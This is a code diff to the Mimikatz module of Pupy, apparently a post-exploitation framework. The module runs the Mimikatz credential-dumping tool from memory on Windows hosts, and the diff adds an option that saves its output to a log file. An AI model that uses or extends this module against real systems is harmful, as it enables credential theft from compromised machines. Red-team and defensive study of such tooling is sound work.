@@ -1,4 +1,4 @@
-# -*- coding: UTF8 -*-
+# -*- coding: utf-8 -*-
 # Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
 # Pupy is under the BSD 3-Clause license. see the LICENSE file at the root of the project for the detailed licence terms
 from pupylib.PupyModule import *
@@ -14,11 +14,12 @@ __class_name__="Mimikatz"
 
 @config(cat="exploit", compat="windows")
 class Mimikatz(MemoryExec):
-    """ 
+    """
         execute mimikatz from memory
     """
     def init_argparse(self):
         self.arg_parser = PupyArgumentParser(prog="mimikatz", description=self.__doc__)
+        self.arg_parser.add_argument('-log', help="Save log to specified path")
         self.arg_parser.add_argument('args', nargs='*', help='run mimikatz commands from argv (let empty to open mimikatz interactively)')
 
 
@@ -39,7 +40,10 @@ class Mimikatz(MemoryExec):
         if not mimikatz_args:
             interactive=True
             timeout=10
+        else:
+            mimikatz_args.append('exit')
 
-        exec_pe(self, mimikatz_args, path=mimikatz_path, interactive=interactive, fork=False, timeout=timeout)
-                
-
+        log = exec_pe(self, mimikatz_args, path=mimikatz_path, interactive=interactive, fork=False, timeout=timeout)
+        if args.log:
+            with open(args.log, 'wb') as output:
+                output.write(log)
